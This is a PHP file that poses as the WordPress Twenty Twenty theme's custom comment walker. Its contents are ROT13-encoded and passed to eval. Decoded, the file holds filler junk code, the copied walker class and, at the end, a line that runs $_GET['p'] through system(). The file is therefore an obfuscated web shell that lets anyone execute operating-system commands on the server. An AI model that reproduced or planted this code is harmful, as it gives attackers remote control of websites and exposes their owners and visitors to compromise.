<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbz pbzzrag jnyxre sbe guvf gurzr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl
 * @fvapr Gjragl Gjragl 1.0
 */

vs ( ! pynff_rkvfgf( 'GjraglGjragl_Jnyxre_Pbzzrag' ) ) {
	/**
	 * PHFGBZ PBZZRAG JNYXRE
	 * N phfgbz jnyxre sbe pbzzragf, onfrq ba gur jnyxre va Gjragl Avargrra.
	 *
	 * @fvapr Gjragl Gjragl 1.0
	 */
	pynff GjraglGjragl_Jnyxre_Pbzzrag rkgraqf Jnyxre_Pbzzrag {

		/**
		 * Bhgchgf n pbzzrag va gur UGZY5 sbezng.
		 *
		 * @fvapr Gjragl Gjragl 1.0
		 *
		 * @frr jc_yvfg_pbzzragf()
		 * @frr uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/trg_pbzzrag_nhgube_hey/
		 * @frr uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/trg_pbzzrag_nhgube/
		 * @frr uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/trg_ningne/
		 * @frr uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/trg_pbzzrag_ercyl_yvax/
		 * @frr uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/trg_rqvg_pbzzrag_yvax/
		 *
		 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag gb qvfcynl.
		 * @cnenz vag        $qrcgu   Qrcgu bs gur pheerag pbzzrag.
		 * @cnenz neenl      $netf    Na neenl bs nethzragf.
		 */
		cebgrpgrq shapgvba ugzy5_pbzzrag( $pbzzrag, $qrcgu, $netf ) {

			$gnt = ( 'qvi' === $netf['fglyr'] ) ? 'qvi' : 'yv';

			?>
			<<?cuc rpub $gnt; // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg.BhgchgAbgRfpncrq -- fgngvp bhgchg ?> vq=\"pbzzrag-<?cuc pbzzrag_VQ(); ?>\" <?cuc pbzzrag_pynff( $guvf->unf_puvyqera ? 'cnerag' : '', $pbzzrag ); ?>>
				<negvpyr vq=\"qvi-pbzzrag-<?cuc pbzzrag_VQ(); ?>\" pynff=\"pbzzrag-obql\">
					<sbbgre pynff=\"pbzzrag-zrgn\">
						<qvi pynff=\"pbzzrag-nhgube ipneq\">
							<?cuc
							$pbzzrag_nhgube_hey = trg_pbzzrag_nhgube_hey( $pbzzrag );
							$pbzzrag_nhgube     = trg_pbzzrag_nhgube( $pbzzrag );
							$ningne             = trg_ningne( $pbzzrag, $netf['ningne_fvmr'] );
							vs ( 0 !== $netf['ningne_fvmr'] ) {
								vs ( rzcgl( $pbzzrag_nhgube_hey ) ) {
									rpub jc_xfrf_cbfg( $ningne );
								} ryfr {
									cevags( '<n uers=\"%f\" ery=\"rkgreany absbyybj\" pynff=\"hey\">', $pbzzrag_nhgube_hey ); // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg.BhgchgAbgRfpncrq --Rfpncrq va uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/trg_pbzzrag_nhgube_hey/
									rpub jc_xfrf_cbfg( $ningne );
								}
							}

							cevags(
								'<fcna pynff=\"sa\">%1$f</fcna><fcna pynff=\"fperra-ernqre-grkg fnlf\">%2$f</fcna>',
								rfp_ugzy( $pbzzrag_nhgube ),
								/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
								__( 'fnlf:', 'gjraglgjragl' )
							);

							vs ( ! rzcgl( $pbzzrag_nhgube_hey ) ) {
								rpub '</n>';
							}
							?>
						</qvi><!-- .pbzzrag-nhgube -->

						<qvi pynff=\"pbzzrag-zrgnqngn\">
							<?cuc
							/* genafyngbef: 1: Pbzzrag qngr, 2: Pbzzrag gvzr. */
							$pbzzrag_gvzrfgnzc = fcevags( __( '%1$f ng %2$f', 'gjraglgjragl' ), trg_pbzzrag_qngr( '', $pbzzrag ), trg_pbzzrag_gvzr() );

							cevags(
								'<n uers=\"%f\"><gvzr qngrgvzr=\"%f\">%f</gvzr></n>',
								rfp_hey( trg_pbzzrag_yvax( $pbzzrag, $netf ) ),
								trg_pbzzrag_gvzr( 'p' ),
								rfp_ugzy( $pbzzrag_gvzrfgnzc )
							);

							vs ( trg_rqvg_pbzzrag_yvax() ) {
								cevags(
									' <fcna nevn-uvqqra=\"gehr\">&ohyy;</fcna> <n pynff=\"pbzzrag-rqvg-yvax\" uers=\"%f\">%f</n>',
									rfp_hey( trg_rqvg_pbzzrag_yvax() ),
									__( 'Rqvg', 'gjraglgjragl' )
								);
							}
							?>
						</qvi><!-- .pbzzrag-zrgnqngn -->

					</sbbgre><!-- .pbzzrag-zrgn -->

					<qvi pynff=\"pbzzrag-pbagrag ragel-pbagrag\">

						<?cuc

						pbzzrag_grkg();

						vs ( '0' === $pbzzrag->pbzzrag_nccebirq ) {
							?>
							<c pynff=\"pbzzrag-njnvgvat-zbqrengvba\"><?cuc _r( 'Lbhe pbzzrag vf njnvgvat zbqrengvba.', 'gjraglgjragl' ); ?></c>
							<?cuc
						}

						?>

					</qvi><!-- .pbzzrag-pbagrag -->

					<?cuc

					$pbzzrag_ercyl_yvax = trg_pbzzrag_ercyl_yvax(
						neenl_zretr(
							$netf,
							neenl(
								'nqq_orybj' => 'qvi-pbzzrag',
								'qrcgu'     => $qrcgu,
								'znk_qrcgu' => $netf['znk_qrcgu'],
								'orsber'    => '<fcna pynff=\"pbzzrag-ercyl\">',
								'nsgre'     => '</fcna>',
							)
						)
					);

					$ol_cbfg_nhgube = gjraglgjragl_vf_pbzzrag_ol_cbfg_nhgube( $pbzzrag );

					vs ( $pbzzrag_ercyl_yvax || $ol_cbfg_nhgube ) {
						?>

						<sbbgre pynff=\"pbzzrag-sbbgre-zrgn\">

							<?cuc
							vs ( $pbzzrag_ercyl_yvax ) {
								rpub $pbzzrag_ercyl_yvax; // cucpf:vtaber JbeqCerff.Frphevgl.RfpncrBhgchg.BhgchgAbgRfpncrq -- Yvax vf rfpncrq va uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/shapgvbaf/trg_pbzzrag_ercyl_yvax/
							}
							vs ( $ol_cbfg_nhgube ) {
								rpub '<fcna pynff=\"ol-cbfg-nhgube\">' . __( 'Ol Cbfg Nhgube', 'gjraglgjragl' ) . '</fcna>';
							}
							?>

						</sbbgre>

						<?cuc
					}
					?>

				</negvpyr><!-- .pbzzrag-obql -->

			<?cuc
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>